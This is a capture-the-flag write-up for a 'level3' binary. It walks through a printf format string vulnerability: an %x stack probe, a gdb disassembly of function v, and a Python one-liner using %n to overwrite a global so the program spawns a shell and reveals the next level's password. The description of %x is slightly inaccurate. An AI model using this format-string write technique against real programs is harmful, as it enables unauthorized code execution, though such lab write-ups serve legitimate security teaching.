We have a `level3` binary that contains 2 functions : `main` and `v`.

`v` uses `fgets` function, which is a secure version of `gets`, so we won't be able to exploit the binary with a bufferoverflow.

Instead, we are going to exploit printf's format strings vulnerabilities.

A reminder of strings format with printf : 

![Strings formats](/level3/Capture%20d%E2%80%99%C3%A9cran%20de%202022-04-29%2017-30-23.png)

We will use the `%x` string format. It will read data from the stack. For each `%x`, `printf()` will fetch a number from the stack, treat this number as an address, and print out the memory contents pointed by this address as a string.

We try to write "AAAA" on the stack and see where it writes it :

> ./level3
>AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
>AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830

We can see that "AAAA" string is written in the **4th argument**. 

Next, we need to open `gdb` and see where to write something.

> (gdb) disass v
```
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

We can see tha the program expects the register `eax` to be equal to `0x40` in order to enter an if condition and open a shell.

Right before that, a value is put in `eax`. This is where we need to write in order to enter the "if" condition : 

`    0x080484da <+54>:	mov    0x804988c,%eax`

We got our target address to write `0x804988c`. In little endian : `\x8c\x98\x04\x08`. The length of the address if 4 bytes.

Because in decimal 0x40 = 64, we need to write 60 + the 4 bytes long of the address. We have to padd the 60 bytes left by writing `%60`.

We add a `| cat` because otherwise the terminal would immediatly close.

> (python -c 'print "\x8c\x98\x04\x08%60x%4$n"' ; cat -) | ./level3 

>Wait what?!   
>cat /home/user/level4/.pass
>b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa


# Sources : 

printf format string exploit : 
- https://axcheron.github.io/exploit-101-format-strings/